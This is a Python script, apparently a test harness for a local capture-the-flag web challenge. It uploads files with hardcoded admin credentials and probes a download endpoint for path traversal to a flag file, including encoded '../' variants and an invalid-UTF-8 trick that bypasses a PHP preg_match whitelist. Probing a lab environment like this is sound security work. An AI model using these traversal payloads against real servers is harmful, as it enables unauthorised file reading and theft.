#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web02_flow.py — 环节二 web02 完整功能流测试（找"环境到底哪里坏了"）

流程：上传 jpg → 下载它 → 上传 zip → 读非法 UTF-8 路径探测 → 探测 /flag 可达性
不做破坏性删除（?delete= 会毁环境，只在末段用可选开关触发）。
"""
import base64
import re
import sys

import requests

requests.packages.urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8')

T = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8090'
S = requests.Session()
S.trust_env = False
S.auth = ('admin', 'admin123')

JPEG = bytes.fromhex(
    'ffd8ffe000104a46494600010100000100010000ffdb004300'
    + 'ff' * 64
    + 'ffc00011080001000103012200021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a0b'
      'ffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1f0'
      '2433627282090a161718191a25262728292a3435363738393a434445464748494a535455565758595a636465666768696a73747576'
      '7778797a838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6'
      'd7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffda000c03010002110311003f00fefa28a2803fffd9')


def hdr(t):
    print(f'\n=== {t} ===')


hdr('1) 上传 jpg')
r = S.post(T + '/admin.php', files={'file': ('probe1.jpg', JPEG, 'image/jpeg')},
           timeout=15, verify=False)
print(f'  {r.status_code}  {"上传成功" if "成功" in r.text else "未见成功提示"}')
print('  msg:', (re.findall(r'class="msg[^"]*">([^<]{0,80})', r.text) or ['(无)'])[0])

hdr('2) 上传 zip（白名单允许）')
import io as _io
import zipfile
buf = _io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('a.txt', 'hello')
r = S.post(T + '/admin.php', files={'file': ('probe1.zip', buf.getvalue(), 'application/zip')},
           timeout=15, verify=False)
print(f'  {r.status_code}  {"上传成功" if "成功" in r.text else "未见成功提示"}')
print('  msg:', (re.findall(r'class="msg[^"]*">([^<]{0,80})', r.text) or ['(无)'])[0])

hdr('3) 下载刚上传的 jpg')
r = S.get(T + '/download.php', params={'file': 'probe1.jpg'}, timeout=15, verify=False)
print(f'  {r.status_code}  len={len(r.content)}  magic={r.content[:4].hex()}  '
      f'{"OK 拿到图片字节" if r.content[:2] == b"\xff\xd8" else "异常"}')

hdr('4) 下载刚上传的 zip')
r = S.get(T + '/download.php', params={'file': 'probe1.zip'}, timeout=15, verify=False)
print(f'  {r.status_code}  len={len(r.content)}  magic={r.content[:4].hex()}  '
      f'{"OK" if r.content[:2] == b"PK" else "异常"}')

hdr('5) 路径穿越探测（各种编码）')
probes = [
    ('明文 ../', '/download.php', {'file': '../../../flag'}),
    ('%2e%2e%2f', '/download.php', {'file': '%2e%2e%2f%2e%2e%2f%2e%2e%2fflag'}),
    ('....//', '/download.php', {'file': '....//....//....//flag'}),
]
for name, path, params in probes:
    rr = S.get(T + path, params=params, timeout=15, verify=False)
    flaghit = bool(re.search(rb'flag\{', rr.content))
    print(f'  {name:12s} -> {rr.status_code} len={len(rr.content):5d} '
          f'{"★ 出 flag!" if flaghit else rr.content[:40]!r}')

hdr('6) ★ 非法 UTF-8 绕 preg_match 白名单（README 推测 A′ 的关键机理）')
# 若白名单 regex 带 /u，非法 UTF-8 会让 preg_match 返回 false，
# 于是 !preg_match(...) == true → 校验被跳过 → 穿越成立。
raw = b'\xff\xfe' + b'../' * 4 + b'flag'
rr = S.get(T + '/download.php', params={'file': raw.decode('latin-1')},
           timeout=15, verify=False)
flaghit = bool(re.search(rb'flag\{', rr.content))
print(f'  原始字节 {raw!r}')
print(f'  -> {rr.status_code} len={len(rr.content)} '
      f'{"★ 出 flag!" if flaghit else rr.content[:60]!r}')
if rr.status_code == 400:
    print('  ⇒ 返回 400 = 被白名单拒（说明本重建版 regex **无 /u 修饰符**，')
    print('     因此 README §4.1 推测 A′ 在此环境**无法复现**）')
elif rr.status_code == 404:
    print('  ⇒ 返回 404 = 白名单**被绕过**（regex 有 /u）但路径未命中')

hdr('7) /flag 可达性总览（从容器外部无法直连，仅确认应用侧无泄漏）')
for path in ('/', '/index.php', '/admin.php', '/demo.php', '/download.php', '/flag', '/flag.txt'):
    try:
        rr = S.get(T + path, timeout=10, verify=False)
        hit = bool(re.search(rb'flag\{', rr.content))
        print(f'  {path:16s} {rr.status_code} len={len(rr.content):6d} {"★" if hit else ""}')
    except Exception as e:
        print(f'  {path:16s} ERR {type(e).__name__}')

print('\n完成。')
